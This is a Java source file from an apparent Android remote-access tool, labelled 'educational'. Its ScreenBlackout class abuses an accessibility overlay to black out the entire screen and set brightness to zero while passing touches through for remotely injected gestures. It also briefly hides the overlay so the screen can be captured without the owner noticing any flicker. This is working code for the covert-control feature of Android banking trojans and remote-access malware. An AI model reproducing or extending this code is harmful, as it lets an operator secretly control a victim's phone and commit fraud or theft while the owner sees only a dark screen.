package com.remoteaccess.educational.commands;

import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.remoteaccess.educational.services.UnifiedAccessibilityService;
import org.json.JSONObject;

/**
 * ScreenBlackout — draws a full-screen opaque black overlay using TYPE_ACCESSIBILITY_OVERLAY.
 *
 * NEW APPROACH (fixes accessibility/responsiveness issues):
 * - Uses FLAG_NOT_TOUCHABLE so all touches pass through to the accessibility layer.
 *   Accessibility gesture dispatch (dispatchGesture) injects events at the system level
 *   and works regardless of touch-consuming overlays, but using FLAG_NOT_TOUCHABLE is cleaner
 *   and ensures the accessibility service's own event loop never blocks.
 * - Sets screenBrightness = 0f (hardware brightness to zero) on the layout params.
 * - Uses FLAG_LAYOUT_NO_LIMITS so the overlay extends above the status bar / notification panel.
 * - runWithOverlayHidden() hides/shows the overlay on the main thread but runs the capture
 *   task on the CALLER'S thread (background), avoiding a deadlock with captureScreenSync()
 *   which itself may post back to the main thread via takeScreenshot().
 */
public class ScreenBlackout {

    private static final String TAG = "ScreenBlackout";

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Object  lock        = new Object();

    private UnifiedAccessibilityService service     = null;
    private View                        overlayView = null;
    private boolean                     active      = false;
    private boolean                     viewAttached = false;

    private static volatile ScreenBlackout instance;

    public static ScreenBlackout getInstance() {
        if (instance == null) {
            synchronized (ScreenBlackout.class) {
                if (instance == null) instance = new ScreenBlackout();
            }
        }
        return instance;
    }

    private ScreenBlackout() {}

    /** Called by UnifiedAccessibilityService.onServiceConnected() */
    public void setService(UnifiedAccessibilityService svc) {
        synchronized (lock) { this.service = svc; }
        Log.i(TAG, "Accessibility service registered — block screen ready");
    }

    /** Called by UnifiedAccessibilityService.onUnbind() */
    public void clearService() {
        synchronized (lock) {
            if (active) removeOverlay();
            this.service = null;
        }
        Log.i(TAG, "Accessibility service unregistered");
    }

    public boolean isActive() {
        synchronized (lock) { return active; }
    }

    /**
     * Enable block screen — runs at front of main queue for minimum latency.
     *
     * Key design decisions:
     * 1. FLAG_NOT_TOUCHABLE: all touches pass through to accessibility service. This means
     *    accessibility gestures (dispatchGesture) continue to work normally.
     * 2. screenBrightness = 0f: dims the physical screen to zero via window params.
     * 3. FLAG_LAYOUT_NO_LIMITS: overlay extends beyond screen bounds, covering status bar/
     *    notification panel (the top area with battery/clock).
     * 4. TYPE_ACCESSIBILITY_OVERLAY: doesn't require SYSTEM_ALERT_WINDOW permission.
     */
    public JSONObject enableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (active) {
                    result.put("success", true);
                    result.put("message", "Screen block already active");
                    return result;
                }
                if (service == null) {
                    result.put("success", false);
                    result.put("error", "Accessibility service not running — enable it first");
                    return result;
                }
            }

            final Object latch      = new Object();
            final boolean[] done    = {false};
            final boolean[] success = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    try {
                        if (service == null || active) return;

                        View v = new View(service);
                        v.setBackgroundColor(Color.BLACK);
                        // No touch listener — FLAG_NOT_TOUCHABLE lets all touches pass through
                        // so the accessibility service can still dispatch gestures.

                        // Get real display size including status bar
                        android.graphics.Point displaySize = new android.graphics.Point();
                        WindowManager wmDisp = (WindowManager) service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wmDisp.getDefaultDisplay().getRealSize(displaySize);
                        int realW = displaySize.x;
                        int realH = displaySize.y;

                        // Get status bar height so we can shift the overlay above it
                        int statusBarH = 0;
                        try {
                            int resId = service.getResources().getIdentifier("status_bar_height", "dimen", "android");
                            if (resId > 0) statusBarH = service.getResources().getDimensionPixelSize(resId);
                        } catch (Exception ignored) {}
                        if (statusBarH <= 0) statusBarH = 80; // safe fallback ~24dp @ 3x

                        // Extra padding to cover display cutouts and rounded corners
                        int extra = 60;

                        // Overlay is shifted UP by (statusBarH + extra) so it starts
                        // well above the status bar, and its height is expanded to match.
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                realW,
                                realH + statusBarH + extra,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                                        | WindowManager.LayoutParams.FLAG_FULLSCREEN,
                                PixelFormat.OPAQUE
                        );
                        params.x = 0;
                        params.y = -(statusBarH + extra);

                        // Cover display cutouts on Android 9+ (notch / punch-hole)
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode =
                                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        // Dim physical screen brightness to zero
                        params.screenBrightness = 0f;

                        WindowManager wm = (WindowManager)
                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                        wm.addView(v, params);

                        overlayView  = v;
                        active       = true;
                        viewAttached = true;
                        success[0]   = true;
                        Log.i(TAG, "Screen block ENABLED — brightness=0, overlay covers full screen including status bar");
                    } catch (Exception e) {
                        Log.e(TAG, "enableBlackout error: " + e.getMessage());
                    }
                }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            synchronized (lock) {
                if (success[0]) {
                    result.put("success", true);
                    result.put("message", "Screen block enabled — brightness at zero, full screen covered");
                } else {
                    result.put("success", false);
                    result.put("error", "Failed to attach overlay — accessibility service may not be active");
                }
            }
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Disable block screen — runs at front of main queue for minimum latency. */
    public JSONObject disableBlackout() {
        JSONObject result = new JSONObject();
        try {
            synchronized (lock) {
                if (!active && !viewAttached) {
                    result.put("success", true);
                    result.put("message", "Screen block already inactive");
                    return result;
                }
            }

            final Object latch   = new Object();
            final boolean[] done = {false};

            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) { removeOverlay(); }
                synchronized (latch) { done[0] = true; latch.notifyAll(); }
            });

            synchronized (latch) {
                long deadline = System.currentTimeMillis() + 1500;
                while (!done[0] && System.currentTimeMillis() < deadline) {
                    try { latch.wait(50); } catch (InterruptedException ignored) { break; }
                }
            }

            result.put("success", true);
            result.put("message", "Screen block disabled — brightness restored");
        } catch (Exception e) {
            try { result.put("success", false); result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }

    /** Must be called on main thread while holding lock. */
    private void removeOverlay() {
        try {
            if (overlayView != null && viewAttached && service != null) {
                WindowManager wm = (WindowManager)
                        service.getSystemService(android.content.Context.WINDOW_SERVICE);
                wm.removeView(overlayView);
            }
        } catch (Exception e) {
            Log.e(TAG, "disableBlackout removeView: " + e.getMessage());
        } finally {
            overlayView  = null;
            active       = false;
            viewAttached = false;
            Log.i(TAG, "Screen block DISABLED — brightness restored");
        }
    }

    /**
     * Briefly hide the overlay so the streaming thread can capture real content,
     * then immediately restore it.
     *
     * Timing target: remove overlay → screenshot → restore overlay in 10–50 ms
     * so the physical user cannot perceive any flicker.
     *
     * Design:
     * - Hide and restore both run at the FRONT of the main-thread queue (postAtFrontOfQueue)
     *   for minimum latency.
     * - The hide step waits at most 30 ms for the main thread to execute.
     * - The capture runs on the CALLER'S background thread (avoids deadlock with
     *   takeScreenshot which itself posts back to the main thread).
     * - The restore is posted at the FRONT of the queue immediately after capture,
     *   so the overlay is back within ~1 frame (≤16 ms) of the capture completing.
     */
    public void runWithOverlayHidden(Runnable captureTask) {
        boolean isActive;
        synchronized (lock) { isActive = active && viewAttached && overlayView != null; }

        if (!isActive) {
            captureTask.run();
            return;
        }

        // Step 1: Post hide to front of main queue — wait at most 30 ms
        final Object hideLatch   = new Object();
        final boolean[] hideDone = {false};

        mainHandler.postAtFrontOfQueue(() -> {
            synchronized (lock) {
                if (overlayView != null) overlayView.setVisibility(View.INVISIBLE);
            }
            synchronized (hideLatch) { hideDone[0] = true; hideLatch.notifyAll(); }
        });

        synchronized (hideLatch) {
            long deadline = System.currentTimeMillis() + 30;
            while (!hideDone[0] && System.currentTimeMillis() < deadline) {
                try { hideLatch.wait(5); } catch (InterruptedException ignored) { break; }
            }
        }

        // Step 2: Run capture on THIS thread (background)
        try {
            captureTask.run();
        } finally {
            // Step 3: Restore at front of main queue — minimum latency
            mainHandler.postAtFrontOfQueue(() -> {
                synchronized (lock) {
                    if (active && viewAttached && overlayView != null) {
                        overlayView.setVisibility(View.VISIBLE);
                    }
                }
            });
        }
    }
}
